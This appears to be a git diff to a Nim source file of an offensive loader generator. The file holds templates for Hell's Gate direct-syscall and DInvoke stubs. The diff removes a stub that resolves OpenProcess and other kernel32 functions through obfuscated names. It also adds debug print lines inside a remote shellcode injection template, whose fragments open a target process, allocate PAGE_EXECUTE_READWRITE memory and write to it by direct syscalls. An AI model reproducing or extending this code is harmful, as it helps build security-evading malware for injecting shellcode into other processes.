@@ -1,32 +1,7 @@
 import strformat
 import strutils
 
-let HellsgateDInvokeBaseStub * = """
 
-const
-  KERNEL32_DLL* = obf("kernel32.dll")
-
-type
-  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
-  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
-  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
-
-const
-  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
-  GetCurrentProcess_HASH * = obf("GetCurrentProcess")
-  OpenProcess_HASH * = obf("OpenProcess")
-
-var MyGetCurrentProcess*: GetCurrentProcess_t
-var MyGetCurrentProcessId*: GetCurrentProcessId_t
-var MyOpenProcess*: OpenProcess_t
-
-MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
-
-MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
-
-MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-
-"""
 
 let HellsgateAllocDelegate*  = """
 
@@ -709,6 +684,8 @@ let HellsShellcoderemoteinjectStub * = """
         &oa, &cid         
     )
 
+    echo obf("[*] NtOpenProcess: "), status
+
     if getSyscall(ntAllocTable):
         syscall = ntAllocTable.wSysCall
     else:
@@ -718,7 +695,7 @@ let HellsShellcoderemoteinjectStub * = """
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-
+    echo obf("[*] NtOpenProcess: "), status
     var bytesWritten: SIZE_T
 
     if getSyscall(ntWriteTable):
